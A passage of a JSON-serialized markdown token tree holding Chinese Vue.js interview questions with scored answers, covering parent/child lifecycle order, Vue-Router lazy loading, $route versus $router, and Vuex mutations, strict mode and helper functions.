解答（2分）\\n\\n","depth":4,"text":"解答（2分）","tokens":[{"type":"text","raw":"解答（2分）","text":"解答（2分）","escaped":false}]},{"type":"paragraph","raw":"对于 runtime 来说，只需要保证组件存在 render 函数即可，而有了预编译之后，只需要保证构建过程中生成 render 函数就可以。在 webpack 中，使用vue-loader编译.vue文件，内部依赖的vue-template-compiler模块，在 webpack 构建过程中，将template预编译成 render 函数。与 react 类似，在添加了jsx的语法糖解析器babel-plugin-transform-vue-jsx之后，就可以直接手写render函数。","text":"对于 runtime 来说，只需要保证组件存在 render 函数即可，而有了预编译之后，只需要保证构建过程中生成 render 函数就可以。在 webpack 中，使用vue-loader编译.vue文件，内部依赖的vue-template-compiler模块，在 webpack 构建过程中，将template预编译成 render 函数。与 react 类似，在添加了jsx的语法糖解析器babel-plugin-transform-vue-jsx之后，就可以直接手写render函数。","tokens":[{"type":"text","raw":"对于 runtime 来说，只需要保证组件存在 render 函数即可，而有了预编译之后，只需要保证构建过程中生成 render 函数就可以。在 webpack 中，使用vue-loader编译.vue文件，内部依赖的vue-template-compiler模块，在 webpack 构建过程中，将template预编译成 render 函数。与 react 类似，在添加了jsx的语法糖解析器babel-plugin-transform-vue-jsx之后，就可以直接手写render函数。","text":"对于 runtime 来说，只需要保证组件存在 render 函数即可，而有了预编译之后，只需要保证构建过程中生成 render 函数就可以。在 webpack 中，使用vue-loader编译.vue文件，内部依赖的vue-template-compiler模块，在 webpack 构建过程中，将template预编译成 render 函数。与 react 类似，在添加了jsx的语法糖解析器babel-plugin-transform-vue-jsx之后，就可以直接手写render函数。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"所以，template和jsx的都是render的一种表现形式，不同的是：JSX相对于template而言，具有更高的灵活性，在复杂的组件中，更具有优势，而 template 虽然显得有些呆滞。但是 template 在代码结构上更符合视图与逻辑分离的习惯，更简单、更直观、更好维护。","text":"所以，template和jsx的都是render的一种表现形式，不同的是：JSX相对于template而言，具有更高的灵活性，在复杂的组件中，更具有优势，而 template 虽然显得有些呆滞。但是 template 在代码结构上更符合视图与逻辑分离的习惯，更简单、更直观、更好维护。","tokens":[{"type":"text","raw":"所以，template和jsx的都是render的一种表现形式，不同的是：JSX相对于template而言，具有更高的灵活性，在复杂的组件中，更具有优势，而 template 虽然显得有些呆滞。但是 template 在代码结构上更符合视图与逻辑分离的习惯，更简单、更直观、更好维护。","text":"所以，template和jsx的都是render的一种表现形式，不同的是：JSX相对于template而言，具有更高的灵活性，在复杂的组件中，更具有优势，而 template 虽然显得有些呆滞。但是 template 在代码结构上更符合视图与逻辑分离的习惯，更简单、更直观、更好维护。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 50. Vue 子组件和父组件执行顺序\\n\\n","depth":2,"text":"50. Vue 子组件和父组件执行顺序","tokens":[{"type":"text","raw":"50. Vue 子组件和父组件执行顺序","text":"50. Vue 子组件和父组件执行顺序","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2分）\\n\\n","depth":4,"text":"解答（2分）","tokens":[{"type":"text","raw":"解答（2分）","text":"解答（2分）","escaped":false}]},{"type":"paragraph","raw":"加载渲染过程：","text":"加载渲染过程：","tokens":[{"type":"text","raw":"加载渲染过程：","text":"加载渲染过程：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"* 1.父 beforeCreate\\n\\n* 2.父 created\\n\\n* 3.父 beforeMount\\n\\n* 4.子 beforeCreate\\n\\n* 5.子 created\\n\\n* 6.子 beforeMount\\n\\n* 7.子 mounted\\n\\n* 8.父 mounted","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"* 1.父 beforeCreate\\n\\n","task":false,"loose":true,"text":"1.父 beforeCreate\\n","tokens":[{"type":"text","raw":"1.父 beforeCreate\\n","text":"1.父 beforeCreate","tokens":[{"type":"text","raw":"1.父 beforeCreate","text":"1.父 beforeCreate","escaped":false}]}]},{"type":"list_item","raw":"* 2.父 created\\n\\n","task":false,"loose":true,"text":"2.父 created\\n","tokens":[{"type":"text","raw":"2.父 created\\n","text":"2.父 created","tokens":[{"type":"text","raw":"2.父 created","text":"2.父 created","escaped":false}]}]},{"type":"list_item","raw":"* 3.父 beforeMount\\n\\n","task":false,"loose":true,"text":"3.父 beforeMount\\n","tokens":[{"type":"text","raw":"3.父 beforeMount\\n","text":"3.父 beforeMount","tokens":[{"type":"text","raw":"3.父 beforeMount","text":"3.父 beforeMount","escaped":false}]}]},{"type":"list_item","raw":"* 4.子 beforeCreate\\n\\n","task":false,"loose":true,"text":"4.子 beforeCreate\\n","tokens":[{"type":"text","raw":"4.子 beforeCreate\\n","text":"4.子 beforeCreate","tokens":[{"type":"text","raw":"4.子 beforeCreate","text":"4.子 beforeCreate","escaped":false}]}]},{"type":"list_item","raw":"* 5.子 created\\n\\n","task":false,"loose":true,"text":"5.子 created\\n","tokens":[{"type":"text","raw":"5.子 created\\n","text":"5.子 created","tokens":[{"type":"text","raw":"5.子 created","text":"5.子 created","escaped":false}]}]},{"type":"list_item","raw":"* 6.子 beforeMount\\n\\n","task":false,"loose":true,"text":"6.子 beforeMount\\n","tokens":[{"type":"text","raw":"6.子 beforeMount\\n","text":"6.子 beforeMount","tokens":[{"type":"text","raw":"6.子 beforeMount","text":"6.子 beforeMount","escaped":false}]}]},{"type":"list_item","raw":"* 7.子 mounted\\n\\n","task":false,"loose":true,"text":"7.子 mounted\\n","tokens":[{"type":"text","raw":"7.子 mounted\\n","text":"7.子 mounted","tokens":[{"type":"text","raw":"7.子 mounted","text":"7.子 mounted","escaped":false}]}]},{"type":"list_item","raw":"* 8.父 mounted","task":false,"loose":true,"text":"8.父 mounted","tokens":[{"type":"text","raw":"8.父 mounted","text":"8.父 mounted","tokens":[{"type":"text","raw":"8.父 mounted","text":"8.父 mounted","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"更新过程：","text":"更新过程：","tokens":[{"type":"text","raw":"更新过程：","text":"更新过程：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"* 1.父 beforeUpdate\\n\\n* 2.子 beforeUpdate\\n\\n* 3.子 updated\\n\\n* 4.父 updated","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"* 1.父 beforeUpdate\\n\\n","task":false,"loose":true,"text":"1.父 beforeUpdate\\n","tokens":[{"type":"text","raw":"1.父 beforeUpdate\\n","text":"1.父 beforeUpdate","tokens":[{"type":"text","raw":"1.父 beforeUpdate","text":"1.父 beforeUpdate","escaped":false}]}]},{"type":"list_item","raw":"* 2.子 beforeUpdate\\n\\n","task":false,"loose":true,"text":"2.子 beforeUpdate\\n","tokens":[{"type":"text","raw":"2.子 beforeUpdate\\n","text":"2.子 beforeUpdate","tokens":[{"type":"text","raw":"2.子 beforeUpdate","text":"2.子 beforeUpdate","escaped":false}]}]},{"type":"list_item","raw":"* 3.子 updated\\n\\n","task":false,"loose":true,"text":"3.子 updated\\n","tokens":[{"type":"text","raw":"3.子 updated\\n","text":"3.子 updated","tokens":[{"type":"text","raw":"3.子 updated","text":"3.子 updated","escaped":false}]}]},{"type":"list_item","raw":"* 4.父 updated","task":false,"loose":true,"text":"4.父 updated","tokens":[{"type":"text","raw":"4.父 updated","text":"4.父 updated","tokens":[{"type":"text","raw":"4.父 updated","text":"4.父 updated","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 51. Vue-Router 的懒加载如何实现\\n\\n","depth":2,"text":"51. Vue-Router 的懒加载如何实现","tokens":[{"type":"text","raw":"51. Vue-Router 的懒加载如何实现","text":"51. Vue-Router 的懒加载如何实现","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2分）\\n\\n","depth":4,"text":"解答（2分）","tokens":[{"type":"text","raw":"解答（2分）","text":"解答（2分）","escaped":false}]},{"type":"paragraph","raw":"加载渲染过程：","text":"加载渲染过程：","tokens":[{"type":"text","raw":"加载渲染过程：","text":"加载渲染过程：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"方案一(常用)：使用箭头函数+import动态加载","text":"方案一(常用)：使用箭头函数+import动态加载","tokens":[{"type":"text","raw":"方案一(常用)：使用箭头函数+import动态加载","text":"方案一(常用)：使用箭头函数+import动态加载","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\n  const List = () => import(\'@/components/list.vue\')\\n  const router = new VueRouter({\\n    routes: [\\n      { path: \'/list\', component: List }\\n    ]\\n  })\\n```","lang":"js","text":"  const List = () => import(\'@/components/list.vue\')\\n  const router = new VueRouter({\\n    routes: [\\n      { path: \'/list\', component: List }\\n    ]\\n  })"},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"方案二：使用箭头函数+require动态加载","text":"方案二：使用箭头函数+require动态加载","tokens":[{"type":"text","raw":"方案二：使用箭头函数+require动态加载","text":"方案二：使用箭头函数+require动态加载","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\nconst router = new Router({\\n  routes: [\\n   {\\n     path: \'/list\',\\n     component: resolve => require([\'@/components/list\'], resolve)\\n   }\\n  ]\\n})\\n\\n```","lang":"js","text":"const router = new Router({\\n  routes: [\\n   {\\n     path: \'/list\',\\n     component: resolve => require([\'@/components/list\'], resolve)\\n   }\\n  ]\\n})\\n"},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"方案二：方案三：使用webpack的require.ensure技术，也可以实现按需加载。 这种情况下，多个路由指定相同的chunkName，会合并打包成一个js文件。","text":"方案二：方案三：使用webpack的require.ensure技术，也可以实现按需加载。 这种情况下，多个路由指定相同的chunkName，会合并打包成一个js文件。","tokens":[{"type":"text","raw":"方案二：方案三：使用webpack的require.ensure技术，也可以实现按需加载。 这种情况下，多个路由指定相同的chunkName，会合并打包成一个js文件。","text":"方案二：方案三：使用webpack的require.ensure技术，也可以实现按需加载。 这种情况下，多个路由指定相同的chunkName，会合并打包成一个js文件。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\n// r就是resolve\\nconst List = r => require.ensure([], () => r(require(\'@/components/list\')), \'list\');\\n// 路由也是正常的写法  这种是官方推荐的写的 按模块划分懒加载 \\nconst router = new Router({\\n  routes: [\\n  {\\n    path: \'/list\',\\n    component: List,\\n    name: \'list\'\\n  }\\n ]\\n}))\\n\\n```","lang":"js","text":"// r就是resolve\\nconst List = r => require.ensure([], () => r(require(\'@/components/list\')), \'list\');\\n// 路由也是正常的写法  这种是官方推荐的写的 按模块划分懒加载 \\nconst router = new Router({\\n  routes: [\\n  {\\n    path: \'/list\',\\n    component: List,\\n    name: \'list\'\\n  }\\n ]\\n}))\\n"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 52. $route 和$router 的区别\\n\\n","depth":2,"text":"52. $route 和$router 的区别","tokens":[{"type":"text","raw":"52. $route 和$router 的区别","text":"52. $route 和$router 的区别","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2分）\\n\\n","depth":4,"text":"解答（2分）","tokens":[{"type":"text","raw":"解答（2分）","text":"解答（2分）","escaped":false}]},{"type":"paragraph","raw":"$route 是“路由信息对象”，包括 path，params，hash，query，fullPath，matched，name 等路由信息参数","text":"$route 是“路由信息对象”，包括 path，params，hash，query，fullPath，matched，name 等路由信息参数","tokens":[{"type":"text","raw":"$route 是“路由信息对象”，包括 path，params，hash，query，fullPath，matched，name 等路由信息参数","text":"$route 是“路由信息对象”，包括 path，params，hash，query，fullPath，matched，name 等路由信息参数","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"$router 是“路由实例”对象包括了路由的跳转方法，钩子函数等。","text":"$router 是“路由实例”对象包括了路由的跳转方法，钩子函数等。","tokens":[{"type":"text","raw":"$router 是“路由实例”对象包括了路由的跳转方法，钩子函数等。","text":"$router 是“路由实例”对象包括了路由的跳转方法，钩子函数等。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 53. Vuex和单纯的全局对象有什么区别？\\n\\n","depth":2,"text":"53. Vuex和单纯的全局对象有什么区别？","tokens":[{"type":"text","raw":"53. Vuex和单纯的全局对象有什么区别？","text":"53. Vuex和单纯的全局对象有什么区别？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2分）\\n\\n","depth":4,"text":"解答（2分）","tokens":[{"type":"text","raw":"解答（2分）","text":"解答（2分）","escaped":false}]},{"type":"paragraph","raw":"Vuex 的状态存储是响应式的。当 Vue 组件从 store 中读取状态的时候，若 store 中的状态发生变化，那么相应的组件也会相应地得到高效更新。","text":"Vuex 的状态存储是响应式的。当 Vue 组件从 store 中读取状态的时候，若 store 中的状态发生变化，那么相应的组件也会相应地得到高效更新。","tokens":[{"type":"text","raw":"Vuex 的状态存储是响应式的。当 Vue 组件从 store 中读取状态的时候，若 store 中的状态发生变化，那么相应的组件也会相应地得到高效更新。","text":"Vuex 的状态存储是响应式的。当 Vue 组件从 store 中读取状态的时候，若 store 中的状态发生变化，那么相应的组件也会相应地得到高效更新。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"不能直接改变 store 中的状态。改变 store 中的状态的唯一途径就是显式地提交 (commit) mutation。这样可以方便地跟踪每一个状态的变化，从而能够实现一些工具帮助更好地了解我们的应用","text":"不能直接改变 store 中的状态。改变 store 中的状态的唯一途径就是显式地提交 (commit) mutation。这样可以方便地跟踪每一个状态的变化，从而能够实现一些工具帮助更好地了解我们的应用","tokens":[{"type":"text","raw":"不能直接改变 store 中的状态。改变 store 中的状态的唯一途径就是显式地提交 (commit) mutation。这样可以方便地跟踪每一个状态的变化，从而能够实现一些工具帮助更好地了解我们的应用","text":"不能直接改变 store 中的状态。改变 store 中的状态的唯一途径就是显式地提交 (commit) mutation。这样可以方便地跟踪每一个状态的变化，从而能够实现一些工具帮助更好地了解我们的应用","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 54. 为什么 Vuex 的 mutation 中不能做异步操作？\\n\\n","depth":2,"text":"54. 为什么 Vuex 的 mutation 中不能做异步操作？","tokens":[{"type":"text","raw":"54. 为什么 Vuex 的 mutation 中不能做异步操作？","text":"54. 为什么 Vuex 的 mutation 中不能做异步操作？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2分）\\n\\n","depth":4,"text":"解答（2分）","tokens":[{"type":"text","raw":"解答（2分）","text":"解答（2分）","escaped":false}]},{"type":"paragraph","raw":"Vuex中所有的状态更新的唯一途径都是mutation，异步操作通过 Action 来提交 mutation实现，这样可以方便地跟踪每一个状态的变化，从而能够实现一些工具帮助更好地了解我们的应用。","text":"Vuex中所有的状态更新的唯一途径都是mutation，异步操作通过 Action 来提交 mutation实现，这样可以方便地跟踪每一个状态的变化，从而能够实现一些工具帮助更好地了解我们的应用。","tokens":[{"type":"text","raw":"Vuex中所有的状态更新的唯一途径都是mutation，异步操作通过 Action 来提交 mutation实现，这样可以方便地跟踪每一个状态的变化，从而能够实现一些工具帮助更好地了解我们的应用。","text":"Vuex中所有的状态更新的唯一途径都是mutation，异步操作通过 Action 来提交 mutation实现，这样可以方便地跟踪每一个状态的变化，从而能够实现一些工具帮助更好地了解我们的应用。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"每个mutation执行完成后都会对应到一个新的状态变更，这样devtools就可以打个快照存下来，然后就可以实现 time-travel 了。如果mutation支持异步操作，就没有办法知道状态是何时更新的，无法很好的进行状态的追踪，给调试带来困难。","text":"每个mutation执行完成后都会对应到一个新的状态变更，这样devtools就可以打个快照存下来，然后就可以实现 time-travel 了。如果mutation支持异步操作，就没有办法知道状态是何时更新的，无法很好的进行状态的追踪，给调试带来困难。","tokens":[{"type":"text","raw":"每个mutation执行完成后都会对应到一个新的状态变更，这样devtools就可以打个快照存下来，然后就可以实现 time-travel 了。如果mutation支持异步操作，就没有办法知道状态是何时更新的，无法很好的进行状态的追踪，给调试带来困难。","text":"每个mutation执行完成后都会对应到一个新的状态变更，这样devtools就可以打个快照存下来，然后就可以实现 time-travel 了。如果mutation支持异步操作，就没有办法知道状态是何时更新的，无法很好的进行状态的追踪，给调试带来困难。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 55. Vuex的严格模式是什么,有什么作用，如何开启？\\n\\n","depth":2,"text":"55. Vuex的严格模式是什么,有什么作用，如何开启？","tokens":[{"type":"text","raw":"55. Vuex的严格模式是什么,有什么作用，如何开启？","text":"55. Vuex的严格模式是什么,有什么作用，如何开启？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2分）\\n\\n","depth":4,"text":"解答（2分）","tokens":[{"type":"text","raw":"解答（2分）","text":"解答（2分）","escaped":false}]},{"type":"paragraph","raw":"在严格模式下，无论何时发生了状态变更且不是由mutation函数引起的，将会抛出错误。这能保证所有的状态变更都能被调试工具跟踪到。","text":"在严格模式下，无论何时发生了状态变更且不是由mutation函数引起的，将会抛出错误。这能保证所有的状态变更都能被调试工具跟踪到。","tokens":[{"type":"text","raw":"在严格模式下，无论何时发生了状态变更且不是由mutation函数引起的，将会抛出错误。这能保证所有的状态变更都能被调试工具跟踪到。","text":"在严格模式下，无论何时发生了状态变更且不是由mutation函数引起的，将会抛出错误。这能保证所有的状态变更都能被调试工具跟踪到。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"在Vuex.Store 构造器选项中开启,如下","text":"在Vuex.Store 构造器选项中开启,如下","tokens":[{"type":"text","raw":"在Vuex.Store 构造器选项中开启,如下","text":"在Vuex.Store 构造器选项中开启,如下","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\nconst store = new Vuex.Store({\\n  strict: true\\n})\\n```","lang":"js","text":"const store = new Vuex.Store({\\n  strict: true\\n})"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 56. 如何在组件中批量使用Vuex的getter属性\\n\\n","depth":2,"text":"56. 如何在组件中批量使用Vuex的getter属性","tokens":[{"type":"text","raw":"56. 如何在组件中批量使用Vuex的getter属性","text":"56. 如何在组件中批量使用Vuex的getter属性","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2分）\\n\\n","depth":4,"text":"解答（2分）","tokens":[{"type":"text","raw":"解答（2分）","text":"解答（2分）","escaped":false}]},{"type":"paragraph","raw":"如何在组件中批量使用Vuex的getter属性","text":"如何在组件中批量使用Vuex的getter属性","tokens":[{"type":"text","raw":"如何在组件中批量使用Vuex的getter属性","text":"如何在组件中批量使用Vuex的getter属性","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"使用mapGetters辅助函数, 利用对象展开运算符将getter混入computed 对象中","text":"使用mapGetters辅助函数, 利用对象展开运算符将getter混入computed 对象中","tokens":[{"type":"text","raw":"使用mapGetters辅助函数, 利用对象展开运算符将getter混入computed 对象中","text":"使用mapGetters辅助函数, 利用对象展开运算符将getter混入computed 对象中","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\nimport {mapGetters} from \'vuex\'\\nexport default{\\n    computed:{\\n        ...mapGetters([\'total\',\'discountTotal\'])\\n    }\\n}\\n```","lang":"js","text":"import {mapGetters} from \'vuex\'\\nexport default{\\n    computed:{\\n        ...mapGetters([\'total\',\'discountTotal\'])\\n    }\\n}"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 57. 如何在组件中重复使用Vuex的mutation\\n\\n","depth":2,"text":"57. 如何在组件中重复使用Vuex的mutation","tokens":[{"type":"text","raw":"57. 如何在组件中重复使用Vuex的mutation","text":"57. 如何在组件中重复使用Vuex的mutation","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2分）\\n\\n","depth":4,"text":"解答（2分）","tokens":[{"type":"text","raw":"解答（2分）","text":"解答（2分）","escaped":false}]},{"type":"paragraph","raw":"使用mapMutations辅助函数,在组件中这么使用","text":"使用mapMutations辅助函数,在组件中这么使用","tokens":[{"type":"text","raw":"使用mapMutations辅助函数,在组件中这么使用","text":"使用mapMutations辅助函数,在组件中这么使用","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"使用mapGetters辅助函数, 利用对象展开运算符将getter混入computed 对象中","text":"使用mapGetters辅助函数, 利用对象展开运算符将getter混入computed 对象中","tokens":[{"type":"text","raw":"使用mapGetters辅助函数, 利用对象展开运算符将getter混入computed 对象中","text":"使用mapGetters辅助函数, 利用对象展开运算符将getter混入computed 对象中","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\nimport { mapMutations } from \'vuex\'\\nmethods:{\\n    ...mapMutations({\\n        setNumber:\'SET_NUMBER\',\\n    })\\n}\\n```","lang":"js","text":"import { mapMutations } from \'vuex\'\\nmethods:{\\n    ...mapMutations({\\n        setNumber:\'SET_NUMBER\',\\n    })\\n}"},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"然后调用this.setNumber(10)相当调用this.$store.commit(\'SET_NUMBER\',10)","text":"然后调用this.setNumber(10)相当调用this.$store.commit(\'SET_NUMBER\',10)","tokens":[{"type":"text","raw":"然后调用this.setNumber(10)相当调用this.$store.commit(\'SET_NUMBER\',10)","text":"然后调用this.setNumber(10)相当调用this.$store.commit(\'SET_NUMBER\',10)","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 58. 为什么不建议用index作为key?\\n\\n","depth":2,"text":"58. 为什么不建议用index作为key?","tokens":[{"type":"text","raw":"58. 为什么不建议用index作为key?","text":"58. 为什么不建议用index作为key?","escaped":false}]},{"type":"heading","raw":"#### 